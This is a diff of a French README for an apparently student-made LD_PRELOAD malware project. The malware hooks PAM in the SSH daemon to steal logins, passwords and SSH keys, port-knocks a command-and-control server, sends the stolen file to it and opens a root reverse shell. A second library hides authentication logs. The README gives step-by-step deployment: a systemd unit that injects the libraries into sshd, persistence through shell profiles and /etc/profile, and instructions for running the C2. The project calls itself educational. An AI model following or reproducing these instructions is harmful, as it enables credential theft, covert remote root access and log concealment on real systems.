@@ -1,78 +1,92 @@
-Projet de Malware utilisant LD_PRELOAD
+Projet Malware LD_PRELOAD
 
-Description :
-
-Ce projet consiste en la création d'un malware en C qui intercepte les fonctions d'authentification SSH pour capturer les identifiants des utilisateurs. Il utilise la technique de LD_PRELOAD pour surcharger les fonctions de la bibliothèque PAM (Pluggable Authentication Modules) et ainsi intercepter les appels aux fonctions d'authentification. Les identifiants capturés sont ensuite envoyés à un serveur de Commande et Contrôle (C2) pour un suivi centralisé.
+Introduction
+Ce projet a pour objectif de démontrer comment utiliser un malware avec  la technique LD_PRELOAD pour intercepter et modifier le comportement d'un serveur SSH. En surchargeant certaines fonctions critiques (via des bibliothèques partagées), le malware extrait les identifiants (login et mot de passe) et les clés SSH de la victime.
+De plus, un mécanisme de port knocking permet de signaler au serveur de Commande & Contrôle (C2) qu'une séquence d'accès est validée, déclenchant ainsi l'ouverture d'un reverse shell pour un accès interactif.
+Enfin, une bibliothèque complémentaire bloque l'accès à certains fichiers sensibles pour empêcher leur lecture par l'utilisateur.
 
 Fonctionnalités :
 
- - Interception des fonctions pam_get_user et pam_get_item pour capturer les noms d'utilisateur et les mots de passe.
- - Envoi des identifiants capturés à un serveur C2 via une connexion TCP.
- - Blocage de l'accès à certains fichiers sensibles en surchargeant les fonctions open, openat et fopen.
+Interception des Credentials et copie des clés SSH :
 
-Fichiers du projet
- - pam_auth_logger.c : Contient le code du malware pour intercepter les fonctions PAM et envoyer les identifiants au serveur C2.
- - block_files.c : Contient le code pour bloquer l'accès à certains fichiers en surchargeant les fonctions de la bibliothèque standard C.
- - Makefile : Script de compilation pour générer la bibliothèque partagée libpam_auth_logger.so.
- - srv_tcp.c : Code du serveur C2 qui reçoit et enregistre les identifiants envoyés par le malware.
+Utilisations des fonctions PAM  via LD_PRELOAD afin d'extraire le login, le mot de passe de l'utilisateur.
+Utilisation de getpwnam() pour déterminer dynamiquement le répertoire personnel de l'utilisateur afin de lire les clés depuis le dossier ~/.ssh.
 
-Avant de procéder a quoi que ce soit sur les machines, effectuez la commande suivante (qui permettra d'installer les outils de compilations,  la bibliotèque libpam + net-tools):
+Port Knocking :
+Envoi de trois connexions TCP successives sur des ports prédéfinis avec un délai entre chaque appel, permettant au C2 de détecter et d'ouvrir les services de réception.
+
+Reverse Shell :
+
+Lancement d'un shell interactif (via forkpty()) qui redirige son entrée/sortie sur une connexion TCP vers le C2.
+
+Blocage de Fichiers Sensibles :
+
+Appel des fonctions d’accès aux fichiers (open(), openat(), fopen()) pour empêcher l’accès à des fichiers critiques ou contenant des logs (ex. /var/log/auth.log).
+
+Structure du Projet :
+
+pam_auth_logger.c
+Cette bibliothèque partagée, injectée via LD_PRELOAD, intercepte les fonctions PAM pour récupérer les credentials et les clés SSH. Elle effectue ensuite le port knocking, envoie un fichier contenant les informations exfiltrées au C2 et lance un reverse shell.
+
+block_files.c
+Bibliothèque partagée également injectée via LD_PRELOAD, qui surcharge les fonctions d'accès aux fichiers pour bloquer l'accès à certains fichiers.
+
+c2 (serveur de Commande & Contrôle)
+Le serveur C2  est configuré pour :
+
+Surveiller les ports de port knocking.
+Recevoir le fichier credentials.txt.
+Accepter les connexions du reverse shell .
+
+
+Installation et Utilisation
+Pré-requis
+Sur la machine victime  installez les outils de compilation et la bibliothèque PAM (pour le C2 installez juste build-essential) :
 
 sudo apt install -y build-essential libpam0g-dev openssh-server
 
-Compilation :
+Compilation
+Cloner le projet et compiler :
 
-Dans un premier temps faites un git clone du projet :
+git clone https://github.com/snipzr/Partiel_C.git
+cd Partiel_C
 
-Ouvrez un shell et copier le projet puis faite un :
+Pour le compiler sur la victime :
 
- -  git clone https://github.com/snipzr/Partiel_C.git
-
-Sur le C2,pour compiler le serveur TCP, utilisez la commande suivante :
-
-- gcc -o srv_tcp srv_tcp.c
-
-Utilisation Démarrage du serveur C2 :
-
-Sur le C2, lancez le serveur TCP :
-
-- ./srv_tcp
-
-Victime :
-
-- sudo su
-
-cd /home/kali/Partiel_C
 make clean && make
 
-Vérifier si SSHD Tourne Déjà
+Pour compiler le C2 (dans Partiel_C allez dans le dossier C2) :
 
-systemctl is-active sshd
+gcc -o c2 c2.c
 
-Si `active`, on doit le désactiver.
+modifiez les port utilisés si vous souhaitez :
 
-Désactiver et Arrêter SSHD
+Sur le C2 dans le fichier c2, lignes 11 à 16
 
-systemctl stop sshd
-systemctl disable sshd
-systemctl mask sshd
+Modifiez avec les memes port dans le pam_auth_logger.c (lignes 34 à 38).
+Mais surtout n'oubliez pas de changer l'adresse ip du C2 (ligne 33) sinon ca ne fonctionnera pas.
 
-systemctl is-enabled sshd
 
-Cela doit renvoyer disabled, masked ou not-found.
+Déploiement sur la Machine Victime
 
-On va créer un service qui charge automatiquement `LD_PRELOAD` au démarrage.
+Arrêter le service SSH existant :
+
+sudo systemctl stop sshd
+sudo systemctl disable sshd
+sudo systemctl mask sshd
+
+On va créer un service qui charge automatiquement LD_PRELOAD au démarrage.
 
 vim /etc/systemd/system/ld_preload_sshd.service
 
-y coller :
+on vas y coller le contenu suivant :
 
 [Unit]
 Description=SSH Daemon with LD_PRELOAD
 After=network.target
 
 [Service]
-Environment="LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so"
+Environment="LD_PRELOAD=/chemin/vers/libpam_auth_logger.so:/chemin/vers/block_files.so"
 ExecStart=/usr/sbin/sshd -D
 Restart=on-failure
 RestartSec=5s
@@ -82,104 +96,51 @@ StandardError=journal
 [Install]
 WantedBy=multi-user.target
 
-verifier si le LD_PRELOAD est bien pris en compte :
+Appliquer et démarrer le service :
 
-cat /tmp/debug.log
-
-doit retourner : LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so
-
-Appliquer et Activer le Service
-
-systemctl daemon-reload
-systemctl enable ld_preload_sshd
-systemctl start ld_preload_sshd
-
-ainsi le  LD_PRELOAD est bien injecté à chaque démarrage et envera a chaque connexion entrente ssh, les crédentials au C2.
-
-Passons à la partie qui bloque l'accès au fichiers suivants (sans droit root):
-
-1.Fichiers de logs systèmes
-
-/var/log/wtmp /var/log/lastlog /var/log/btmp /var/log/auth.log /var/log/sysstat
-
-2.Journaux de systemd
-
-/var/log/journal
-
-3.Logs liés à l'affichage graphique
-
-Toute occurrence contenant "Xorg." (exemple : /var/log/Xorg.0.log)
-
-On vas utiliser le libpam_auth_logger.so deja existant, pour verifier, dans Partiel_c :
-
-ls -l libpam_auth_logger.so
-
-Si rien ne sort, recompilez : 
-
-make clean && make
-
-Ensuite testez manuellement via :
-
-LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so cat /var/log/auth.log
-
-La commande doit renvoyer une erreur Permission denied.
-
-La suite dependra du shell utillisé , pour savoir le quel on utilise :
-
-echo $0
-
-si bash est utilisé :
-
-echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.bashrc
-source ~/.bashrc
-
-si zsh est utilisé :
-
-echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.zshrc
-source ~/.zshrc
-
-il suffit de modifier  ~/.shell_utilisé
-
-Vérifie que la variable est bien prise en compte :
-
-echo $LD_PRELOAD
-
-Ce qui affichera : /home/user/Partiel_C/libpam_auth_logger.so
-
-Pour vérifier que le LD=PRELOAD soit toujours chargé, fermez le terminal puis ouvrez en un autre puis :
-
-echo $LD_PRELOAD
-
-Si la variable est toujours definie le LD=PRELOAD se chargera a chaque fois
-
-Essayez maintenant d'ouvrir un des fichier ciblé, ca ne devrai pas fonctionner
-
-ex : cat /var/log/auth.log
-
-FACULTATIF CAR NECESSITE ROOT : Automatisation au démarrage pour TOUS les utilisateurs
-
-Si l'on veux que tout les utilisateurs aient ce LD_PRELOAD sans qu'ils modifient .bashrc/.zshrc, On ajoute cette ligne dans /etc/profile :
-
-echo 'export LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so' | sudo tee -a /etc/profile-
-EXPLICATION :
+sudo systemctl daemon-reload
+sudo systemctl enable ld_preload_sshd
+sudo systemctl start ld_preload_sshd
 
 
-Fonctionnement de LD_PRELOAD
+Déploiement sur le Serveur C2
 
-LD_PRELOAD est une variable d'environnement utilisée sur les systèmes Unix pour spécifier des bibliothèques partagées à charger avant les autres lors de l'exécution d'un programme. Cela permet de surcharger des fonctions spécifiques, offrant ainsi la possibilité de modifier le comportement d'applications sans changer leur code source.
+lancez l'écoute grce a la commande :
 
-Dans ce projet, LD_PRELOAD nous permet d'intercepter les appels aux fonctions PAM sans modifier le code source du démon SSH. En utilisant cette technique, nous chargeons la bibliothèque libpam_auth_logger.so avant les autres bibliothèques système. Cela redéfinit des fonctions comme pam_get_user et pam_get_item pour capturer les identifiants utilisateur, qui sont ensuite transmis au serveur C2. L'approche par LD_PRELOAD est discrète et évite de nécessiter des droits root, ce qui est en phase avec les objectifs du projet.
+./c2
 
 
-Fonctionnement d'un Linker
+Connexion SSH via une autre machine:
+connectez-vous en SSH à la machine victime. Cette connexion déclenchera :
 
-Un linker, ou éditeur de liens, est un outil qui combine divers modules de code objet en un seul exécutable ou une bibliothèque. Il résout les références entre les symboles (fonctions, variables) définis dans différents modules, permettant ainsi à un programme de fonctionner correctement.
+L'interception et l'écriture du login, du mot de passe et la copie  des clés SSH dans /tmp/credentials.txt.
+Le port knocking et l'envoi du fichier au C2 sous le nom de credentials_<IP_victime> .
+Le lancement d'un reverse shell en root vers le C2.
 
-Dans le contexte de LD_PRELOAD, le linker dynamique (ld.so sur les systèmes Linux) joue un rôle clé en redirigeant les appels système vers nos fonctions redéfinies. Lorsque notre bibliothèque est chargée, le linker garantit que les appels aux fonctions PAM (par exemple, pam_get_user) passent par nos définitions personnalisées. Cette redirection est ce qui permet d'intercepter les credentials sans modifier directement les fichiers binaires du démon SSH.
+Explications Techniques
 
+Fonctionnement du Linker et de LD_PRELOAD
+
+Le linker dynamique (ld.so) est chargé au démarrage d'un programme de lier dynamiquement les bibliothèques partagées. La variable d'environnement LD_PRELOAD permet d'indiquer au linker de charger, en priorité, une ou plusieurs bibliothèques spécifiées avant les bibliothèques système.
+Dans notre projet, cela permet d'injecter nos bibliothèques personnalisées (libpam_auth_logger.so et block_files.so) dans le processus SSH sans modifier le binaire d'OpenSSH. Ainsi, nous pouvons intercepter et surcharger les fonctions critiques (comme pam_get_item, open, etc.) pour extraire des données sensibles ou bloquer l'accès à certains fichiers.
 
 Fonctionnement des Threads sur Linux
 
-Un thread est une unité d'exécution au sein d'un processus. Les threads partagent le même espace mémoire et les mêmes ressources, mais peuvent être exécutés indépendamment, permettant une exécution parallèle au sein d'une application.
+Un thread est une unité d'exécution légère au sein d'un processus qui partage le même espace mémoire que les autres threads du même processus.
+Dans notre serveur C2, les threads sont utilisés pour :
 
-Dans ce projet, les threads pourraient être utilisés pour gérer plusieurs connexions simultanément entre les machines infectées et le serveur C2. Par exemple, chaque fois que des credentials sont capturés et transmis, un thread distinct pourrait gérer l'envoi au serveur C2, tout en permettant au malware de continuer à fonctionner en arrière-plan. Cela garantit une exécution fluide et rapide des tâches sans bloquer le système.
+Écouter simultanément sur plusieurs ports (port knocking, réception des credentials, reverse shell).
+Permettre une gestion concurrente des connexions entrantes sans bloquer l'ensemble du service.
+Chaque thread s'exécute indépendamment, ce qui permet au serveur de rester réactif même en cas de multiples connexions simultanées.
+
+Exemple dans le Projet
+
+LD_PRELOAD est utilisé dans pam_auth_logger.c pour que, lors d'une connexion SSH, notre bibliothèque soit chargée avant les bibliothèques PAM système. Cela permet d'intercepter l'authentification et d'extraire les informations sensibles.
+
+Threads (dans le code du serveur C2, par exemple) sont employés pour lancer des écouteurs sur différents ports en parallèle. Chaque thread gère une tâche spécifique (port knocking, réception des fichiers, reverse shell), garantissant ainsi une exécution concurrente efficace.
+
+
+
+Conclusion
+Ce projet démontre comment combiner LD_PRELOAD, l'injection de bibliothèques personnalisées et l'utilisation de threads pour intercepter et exfiltrer discrètement des informations sensibles, tout en bloquant l'accès à certains fichiers critiques.
+Bien que ce projet soit à but pédagogique, il met en œuvre des techniques avancées d'injection dynamique et d'exécution parallèle sur Linux.
